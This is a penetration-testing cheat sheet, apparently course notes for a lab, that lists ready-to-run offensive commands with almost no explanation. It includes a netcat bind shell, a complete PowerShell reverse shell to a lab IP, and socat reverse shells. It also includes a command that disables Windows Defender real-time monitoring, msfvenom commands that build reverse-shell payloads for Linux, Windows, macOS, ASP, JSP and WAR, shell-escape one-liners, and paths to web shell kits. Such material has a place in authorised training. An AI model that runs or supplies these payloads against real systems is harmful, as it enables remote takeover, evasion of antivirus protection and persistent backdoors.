# Shells and Payloads

## Environment Enumeration

```bash
env
```

## Netcat

### Listener

```bash
sudo nc -lvnp <port>
```

### Connect to Listener

```bash
nc -nv <ip_address> <port>
```

### Bind Shell

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

## PowerShell Reverse Shell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Shell Upgrades

### Python

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Full TTY

```bash
stty raw -echo; fg
reset
xterm
```

## Socat

### Reverse Shell

```bash
socat TCP:10.10.14.113:443 EXEC:/bin/bash
```

### Listener

```bash
socat TCP-LISTEN:443,reuseaddr,fork EXEC:/bin/bash
```

## Disable Windows Defender

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

## MSFvenom Payloads

### Linux

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > payload.elf
```

### Windows

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > payload.exe
```

### macOS

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > payload.macho
```

### ASP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > payload.asp
```

### JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > payload.jsp
```

### WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > payload.war
```

## Shell Spawning

### Python

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

### Basic Linux

```bash
/bin/sh -i
```

### Perl

```bash
perl -e 'exec "/bin/sh";'
```

### Ruby

```ruby
exec "/bin/sh"
```

### Lua

```lua
os.execute('/bin/sh')
```

### Awk

```bash
awk 'BEGIN {system("/bin/sh")}'
```

### find

```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit
```

### Vim Escape

```bash
vim -c ':!/bin/sh'
```

## Web Shell Locations

### Laudanum

```bash
/usr/share/webshells/laudanum
```

### Antak

```bash
/usr/share/nishang/Antak-WebShell
```
